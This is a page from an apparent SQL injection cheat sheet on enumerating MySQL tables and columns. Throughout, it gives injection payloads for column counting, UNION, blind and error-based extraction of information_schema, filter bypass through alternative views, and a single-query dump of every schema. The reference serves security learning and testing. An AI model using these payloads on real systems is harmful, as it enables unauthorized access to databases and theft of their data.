---
title: Tables and Columns
description: How to discover and extract table and column information in MySQL
category: Information Gathering
order: 9
tags: ["schema", "tables", "columns", "enumeration"]
lastUpdated: 2025-03-15
---

## Tables and Columns

Discovering table and column information is a critical step in SQL injection attacks. This information helps map the database structure for targeted data extraction.

### Determining Number of Columns

There are several methods to determine the number of columns in a query:

#### Using ORDER BY or GROUP BY

```sql
-- Keep incrementing n until you get an error
ORDER BY n
GROUP BY n
```

**Example:**

```sql
-- Assuming query: SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';
1' ORDER BY 1--+        -- True
1' ORDER BY 2--+        -- True
1' ORDER BY 3--+        -- True
1' ORDER BY 4--+        -- False (Error) - Query is only using 3 columns
-1' UNION SELECT 1,2,3--+ -- True (Success)
```

#### Using GROUP BY with Error-based Method

```sql
-- Will show the column number in the error
1' GROUP BY 1,2,3,4,5--+
```

**Example:**

```sql
-- Assuming query with 3 columns
1' GROUP BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'group statement'"
1' ORDER BY 1,2,3,4,5--+  -- Error: "Unknown column '4' in 'order clause'"
```

#### Using INTO Variables

```sql
-- Useful for finding columns after a LIMIT clause
-1 UNION SELECT 1 INTO @,@,@  -- Adjust number of @'s
```

**Example:**

```sql
-- Assuming query: SELECT permission FROM Users WHERE id = {INJECTION POINT};
-1 UNION SELECT 1 INTO @,@,@  -- Error: Different number of columns
-1 UNION SELECT 1 INTO @,@    -- Error: Different number of columns
-1 UNION SELECT 1 INTO @      -- No error means query uses 1 column
```

#### Using Subquery Comparison

```sql
-- Shows number of columns in the table (not query)
AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
```

**Example:**

```sql
1 AND (SELECT * FROM Users) = 1  -- Error: "Operand should contain 3 column(s)"
```

### Retrieving Tables

#### Using UNION

```sql
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
```

#### Using Blind Injection

```sql
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
```

#### Using Error-based Techniques

```sql
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))

-- Alternative method
(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);

-- Available in MySQL 5.1.5 and later
AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
```

### Retrieving Columns

#### Using UNION

```sql
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
```

#### Using Blind Injection

```sql
AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

#### Using PROCEDURE ANALYSE() (Legacy)

_Note: Deprecated in MySQL 5.7, removed in MySQL 8.0._

This technique can automatically extract column information when a query's output is displayed:

```sql
-- Appends column info to the query result
1 PROCEDURE ANALYSE()          -- First column
1 LIMIT 1,1 PROCEDURE ANALYSE() -- Second column
```

It requires that one of the selected columns in the injection point is displayed by the application. This is useful when `UNION` is filtered or unavailable.

**Note:** In MySQL 5, use `version=10` when querying `information_schema.tables`.

### Find Tables by Column Name

When looking for specific data like usernames or passwords:

```sql
-- Find tables containing a specific column
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';

-- Find tables with columns matching a pattern
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

### Current Query Inspection

Available in MySQL 5.1.7+, you can view the currently executing query:

```sql
SELECT info FROM information_schema.processlist;
```

This can reveal the full query structure including parts you cannot see in the application response.

### Alternative information_schema Views

When `information_schema.tables` or `information_schema.columns` are blocked:

| Alternative View                       | Contains Table Names |
| -------------------------------------- | -------------------- |
| `information_schema.partitions`        | Yes                  |
| `information_schema.statistics`        | Yes                  |
| `information_schema.key_column_usage`  | Yes                  |
| `information_schema.table_constraints` | Yes                  |

### Retrieving Multiple Databases at Once

This advanced payload retrieves all databases, tables, and columns in a single query:

```sql
SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ]>',table_name,' > ',column_name))))x
```

This technique uses variable assignment within a subquery to concatenate all schema information into a single result.
